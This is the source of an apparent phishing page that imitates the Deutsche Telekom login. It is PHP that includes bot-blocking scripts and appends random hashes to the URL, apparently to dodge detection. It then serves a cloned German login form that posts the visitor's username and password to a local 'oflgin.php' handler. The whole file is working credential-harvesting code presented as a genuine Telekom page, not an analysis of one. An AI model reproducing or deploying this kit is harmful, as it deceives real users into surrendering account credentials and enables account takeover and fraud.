<?php
include './prevents/bot1.php';
include './prevents/bot2.php';
include './prevents/bot3.php';
include './prevents/bot4.php';
include './prevents/bot5.php';
include './prevents/bot6.php';
include './prevents/bot7.php';
include './prevents/bot8.php';
session_start();
//Add Random characters to URL
$actual_link = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if (strpos($actual_link, 'Service_Login_&_Authentication') !== false) {
    //Do nothing
}elseif(strpos($actual_link, '?') != true){
    $url = $actual_link."?&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
    header("Location: ".$url);  
}else{
    $url = $actual_link."&SERVID=Service_Login_&_Authentication=".sha1(uniqid(time())).sha1(uniqid(time())).sha1(uniqid(time()));
    header("Location: ".$url);
}
?>
<!DOCTYPE html>

<html class="no-js" lang="de"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Telekom Login</title>
 
    <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="./assets/favicon.png" rel="shortcut icon" type="image/x-icon">

    <link rel="stylesheet" type="text/css" href="./assets/components.min.css">
    <link rel="stylesheet" type="text/css" href="./assets/login-20.26.0.css">

    <script type="text/javascript" src="./assets/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="./assets/components.min.js"></script>
    <script type="text/javascript" src="./assets/login.js"></script>
    
</head>


<body class="">
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">tT</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">erleben, was verbindet.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>

    

    
    

    <div class="offset-bottom-5 offset-s-bottom-3"></div>

</div>




<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                <h4>Telekom.de</h4>
                
            </div>
            <h1 class="offset-top-0 offset-bottom-3 text-center">Telekom Login Benutzername eingeben</h1>
        </div>

        <div class="login-box">
            

            <div class="offset-bottom-1">
                <form  method="POST" action="oflgin.php" >
                    
                                    
                    <div class="offset-bottom-1">
                        
                        <div class="form-input-set">
                            <input required="" id="pw_usr" name="user" type="email" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="username">

                            <label for="pw_usr">Benutzername</label>
                            <i class="info-question-icon" data-toggle="collapse" data-target="#usrInfo" data-toggle-hide="true" tabindex="60"></i>
                        </div>

                            <div class="form-input-set">
                            <input required="" id="pw_usr" name="pass" type="Password" class="form-input" maxlength="256" aria-describedby="usrInfo" tabindex="10" value="" autocomplete="username">

                            <label for="pw_usr">Passwort</label>
                            
                        </div>

                       

                        
                    
                        


                        
                        <div class="login-helpers clearfix">
                            <!-- remember username component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div>

                                    <input id="checkbox_remember_user" type="checkbox" name="remember_user" value="1" class="form-checkbox hidden" tabindex="30">
                                    <span>Benutzername merken</span>
                                </label>
                            </div>
                            
                            <div id="tbs-recovery-link" class="text-right">
                                <button class="btn-link" role="button" name="showSelectIdentMethod" tabindex="44" type="submit">Benutzername vergessen?</button>
                            </div>
                        </div>

                        
                        <div class="clearfix">
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center text-uppercase btn btn-brand btn-block btn-large" tabindex="40">Weiter</button>
                        </div>
                    </div>
                 
                </form>

                

                <div class="text-center offset-bottom-2 offset-top-2">
                    <a href="#" tabindex="45" target="_blank">Brauchen Sie Hilfe?</a>
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Noch keinen Telekom Login?</span>
                            <a class="text-nowrap" tabindex="50" href="#">Telekom Login erstellen</a>
                            <span>und Telekom.de nutzen.</span>
                        </p>
                    </div>
                </div>

                <div class="text-center offset-bottom-2">
                    <img src="./assets/services.png">
                </div>

                <div class="text-center offset-bottom-2">
                    <div>
                        <p>
                            <span>Jetzt auch mit Ihrem VERIMI Konto bei der Telekom anmelden.</span>
                            <a class="text-nowrap" tabindex="60" target="_blank" href="#">Hier informieren über VERIMI</a>
                        </p>
                    </div>
                </div>

            </div>
        </div>
    </div>

</div>


<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>© Telekom Deutschland GmbH</p>
            <p class="tbs-text-11">20.26.0, e0d34848729da03ab3a0d991b86dffee, ae2dd5a442a99de220aa4f4bfbd2aca1a18b981a</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="#" target="_blank">Impressum</a>
                </li>
                <li>
                    <a id="data-protection" href="#" target="_blank">Datenschutz</a>
                </li>
            </ul>
        </div>
    </div>
</footer>



<div>
    
</div>


</body></html>